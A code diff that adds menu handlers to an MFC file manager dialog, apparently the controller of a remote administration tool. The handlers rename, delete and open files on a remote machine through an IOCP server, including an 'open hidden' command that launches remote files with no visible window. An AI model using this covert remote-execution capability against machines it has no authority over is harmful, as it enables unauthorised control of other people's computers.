@@ -136,6 +136,16 @@ BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialogEx)
 	ON_UPDATE_COMMAND_UI(IDT_REMOTE_STOP, &CFileManagerDlg::OnUpdateRemoteStop)
 	ON_NOTIFY(NM_RCLICK, IDC_LIST_LOCAL, &CFileManagerDlg::OnNMRClickListLocal)
 	ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, &CFileManagerDlg::OnNMRClickListRemote)
+	ON_COMMAND(IDM_TRANSFER, &CFileManagerDlg::OnTransfer)
+	ON_COMMAND(IDM_RENAME, &CFileManagerDlg::OnRename)
+	ON_COMMAND(IDM_DELETE, &CFileManagerDlg::OnDelete)
+	ON_COMMAND(IDM_NEWFOLDER, &CFileManagerDlg::OnNewfolder)
+	ON_COMMAND(IDM_LOCAL_OPEN, &CFileManagerDlg::OnLocalOpen)
+	ON_COMMAND(IDM_REMOTE_OPEN_SHOW, &CFileManagerDlg::OnRemoteOpenShow)
+	ON_COMMAND(IDM_REMOTE_OPEN_HIDE, &CFileManagerDlg::OnRemoteOpenHide)
+	ON_COMMAND(IDM_REFRESH, &CFileManagerDlg::OnRefresh)
+	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_LOCAL, &CFileManagerDlg::OnLvnEndlabeleditListLocal)
+	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, &CFileManagerDlg::OnLvnEndlabeleditListRemote)
 END_MESSAGE_MAP()
 
 
@@ -2221,5 +2231,160 @@ void CFileManagerDlg::OnNMRClickListRemote(NMHDR *pNMHDR, LRESULT *pResult)
 
 	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
 	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
+	*pResult = 0;
+}
+
+
+void CFileManagerDlg::OnTransfer()
+{
+	// TODO: 在此添加命令处理程序代码
+	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
+	{
+		OnLocalCopy();
+	} 
+	else
+	{
+		OnRemoteCopy();
+	}
+}
+
+
+void CFileManagerDlg::OnRename()
+{
+	// TODO: 在此添加命令处理程序代码
+	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
+	{
+		m_list_local.EditLabel(m_list_local.GetSelectionMark());
+	} 
+	else
+	{
+		m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
+	}
+}
+
+
+void CFileManagerDlg::OnDelete()
+{
+	// TODO: 在此添加命令处理程序代码
+	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
+	{
+		OnLocalDelete();
+	} 
+	else
+	{
+		OnRemoteDelete();
+	}
+}
+
+
+void CFileManagerDlg::OnNewfolder()
+{
+	// TODO: 在此添加命令处理程序代码
+	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
+	{
+		OnLocalNewfolder();
+	}
+	else
+	{
+		OnRemoteNewfolder();
+	}
+}
+
+
+void CFileManagerDlg::OnLocalOpen()
+{
+	// TODO: 在此添加命令处理程序代码
+	CString str;
+	str = m_Local_Path + m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
+	ShellExecute(NULL, "open", str, NULL, NULL, SW_SHOW);
+}
+
+
+void CFileManagerDlg::OnRemoteOpenShow()
+{
+	// TODO: 在此添加命令处理程序代码
+	CString str;
+	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
+
+	int nPacketLength = str.GetLength() + 2;
+	BYTE *lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
+
+	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
+	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
+	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
+
+	LocalFree(lpPacket);
+}
+
+
+void CFileManagerDlg::OnRemoteOpenHide()
+{
+	// TODO: 在此添加命令处理程序代码
+	CString str;
+	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
+
+	int nPacketLength = str.GetLength() + 2;
+	BYTE *lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
+
+	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
+	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
+	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
+
+	LocalFree(lpPacket);
+}
+
+
+void CFileManagerDlg::OnRefresh()
+{
+	// TODO: 在此添加命令处理程序代码
+	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
+	{
+		FixedLocalFileList(".");
+	}
+	else
+	{
+		GetRemoteFileList(".");
+	}
+}
+
+
+void CFileManagerDlg::OnLvnEndlabeleditListLocal(NMHDR *pNMHDR, LRESULT *pResult)
+{
+	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
+	// TODO: 在此添加控件通知处理程序代码
+
+	CString str, strExistingFileName, strNewFileName;
+
+	m_list_local.GetEditControl()->GetWindowText(str);
+	strNewFileName = m_Local_Path + str;
+	strExistingFileName = m_Local_Path + m_list_local.GetItemText(pDispInfo->item.iItem, 0);
+
+	*pResult = ::MoveFile(strExistingFileName, strNewFileName);
+}
+
+
+void CFileManagerDlg::OnLvnEndlabeleditListRemote(NMHDR *pNMHDR, LRESULT *pResult)
+{
+	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
+	// TODO: 在此添加控件通知处理程序代码
+
+	CString str, strExistingFileName, strNewFileName;
+
+	m_list_remote.GetEditControl()->GetWindowText(str);
+	strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
+	strNewFileName		= m_Remote_Path + str;
+
+	if (strExistingFileName != strNewFileName)
+	{
+		int nPacketLength = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
+		LPBYTE lpPacket	  = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
+
+		lpPacket[0]		  = COMMAND_RENAME_FILE;
+		memcpy(lpPacket + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() +1);
+		memcpy(lpPacket + 2 + strExistingFileName.GetLength(), strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
+
+		m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
+		LocalFree(lpPacket);
+	}
 	*pResult = 0;
 }
